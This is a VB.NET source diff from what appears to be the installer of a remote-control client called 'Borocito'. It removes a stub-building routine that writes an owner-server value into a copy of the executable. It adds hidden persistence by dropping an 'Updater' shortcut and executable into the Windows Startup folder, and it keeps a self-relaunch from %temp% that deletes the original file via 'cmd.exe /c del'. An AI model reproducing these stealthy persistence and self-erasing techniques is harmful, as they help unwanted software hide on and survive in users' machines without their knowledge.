@@ -46,28 +46,6 @@ Module Memory
             End
         End Try
     End Sub
-    Sub PutInject()
-        Try
-            AddToLog("PutInject@Memory", "Inyectando...", False)
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoExtractor.exe") Then
-                My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoExtractor.exe")
-            End If
-            Dim stub As String
-            Const FS1 As String = "|BRO|"
-            Dim Temp As String = DIRCommons & "\BorocitoExtractor.exe"
-            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(Application.ExecutablePath)
-            File.WriteAllBytes(Temp, bytesEXE)
-            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
-            stub = Space(LOF(1))
-            FileGet(1, stub)
-            FileClose(1)
-            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
-            FilePut(1, stub & FS1 & OwnerServer & FS1)
-            FileClose(1)
-        Catch ex As Exception
-            AddToLog("PutInject@Memory", "Error: " & ex.Message, True)
-        End Try
-    End Sub
 End Module
 Module StartUp
     Sub Init()
@@ -81,6 +59,8 @@ Module StartUp
             CheckIfExist()
             'Extraer
             StartExtract()
+            'Crear registro para iniciar con Windows
+            StartWithWindows()
             'Iniciar
             InitUpdater()
         Catch ex As Exception
@@ -96,7 +76,9 @@ Module StartUp
                 End If
                 My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRTemp & "\BoroExtractor.exe")
                 Process.Start(DIRTemp & "\BoroExtractor.exe", parameters)
-                Process.Start("cmd.exe", "/c del " & Application.ExecutablePath)
+                If Application.ExecutablePath.StartsWith("C") Then
+                    Process.Start("cmd.exe", "/c del " & Application.ExecutablePath)
+                End If
                 End
             Else
                 AddToLog("RunFromLocation@StartUp", "Se esta ejecutando desde %temp%", False)
@@ -148,6 +130,24 @@ Module StartUp
             regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
         Catch ex As Exception
             AddToLog("SetExistence@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub StartWithWindows()
+        Try
+            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
+            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
+            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
+                Dim WSHShell As Object = CreateObject("WScript.Shell")
+                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
+                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
+                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
+                Shortcut.WindowStyle = 1
+                Shortcut.Description = "Updater software for Borocito"
+                Shortcut.Save()
+                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
+            End If
+        Catch ex As Exception
+            AddToLog("StartWithWindows@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub StartExtract()
